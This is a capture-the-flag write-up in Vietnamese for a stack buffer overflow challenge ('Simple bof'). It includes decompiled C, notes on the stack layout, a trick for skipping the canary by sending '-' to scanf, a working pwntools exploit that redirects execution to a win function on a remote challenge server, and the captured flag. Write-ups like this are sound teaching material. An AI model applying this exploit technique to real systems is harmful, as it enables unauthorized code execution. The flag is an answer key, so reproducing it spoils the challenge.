# Simple bof (pwn)

Check binary

<figure><img src="../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

Decompile bằng IDA

{% code lineNumbers="true" %}
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v5; // [rsp+8h] [rbp-98h] BYREF
  int i; // [rsp+Ch] [rbp-94h]
  _QWORD v7[16]; // [rsp+10h] [rbp-90h] BYREF
  __int64 v8; // [rsp+90h] [rbp-10h]
  unsigned __int64 v9; // [rsp+98h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  v8 = 1LL;
  printf("First useful number: 0x%x\n", &locret_40101A);
  printf("Second useful number %p\n", win);
  puts("How many magic numbers do you wanna tell me?");
  __isoc99_scanf("%d", &v5);
  puts("Ok.");
  for ( i = 0; i < v5; ++i )
  {
    printf("%d. ", (unsigned int)(i + 1));
    __isoc99_scanf("%lu", &v7[i]);
  }
  if ( v8 != 0xDEADBEEFDEADBEEFLL )
  {
    puts("Thanks a lot.");
    exit(0);
  }
  puts("Don't forget the canary.");
  return __readfsqword(0x28u) ^ v9;
}
```
{% endcode %}

Bài này không kiểm tra size ở line 15, nếu ta nhập v5 >16 -> ghi đè ra ngoài biến array v7 -> overflow

Qua quá trình debug mình thấy:

\+ biến v8 ở index 16

\+ stack canary ở index 17

\+ saved rip ở index 19 -> mình sẽ ghi đè thành địa chỉ của `ret` gadget ( leak ở line 12) -> rồi ghi đè địa chỉ hàm win ở index 20 ( bài này `no-pie` nên leak win không cần thiết lắm :))) ).

\+ Nhập `-` hay `+` thì hàm scanf sẽ không thay đổi giá trị của biến =)).

Script giải

```python
from pwn import *
from time import sleep
e=ELF("./simple_bof")
#p=e.process()
p=remote("45.122.249.68",10018)
#context.log_level='debug'
#gdb.attach(p,gdbscript="\nb *main+307")
p.recvuntil(b"First useful number: ")
sleep(1)
leak=p.recvuntil(b"\n").rstrip().decode()
sleep(1)
leak=int(leak,16)
log.info(hex(leak))
p.sendline(b"21")
sleep(1)
#pause()
for i in range(21):
    if i==16:
        p.sendline(str(0xDEADBEEFDEADBEEF).encode())
    #elif i==17:
    #    p.sendline('-'.encode())
    elif i==19:
        p.sendline(str(leak).encode())
    elif i==20:
        p.sendline(str(e.sym["win"]).encode())
    else:
        p.sendline('-'.encode())
    sleep(1)
p.interactive()

```

<figure><img src="../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

Flag: `W1{sUp3r_e4sY_b0f_74f2f624d3c92c1d739b6b0b238c0321}`





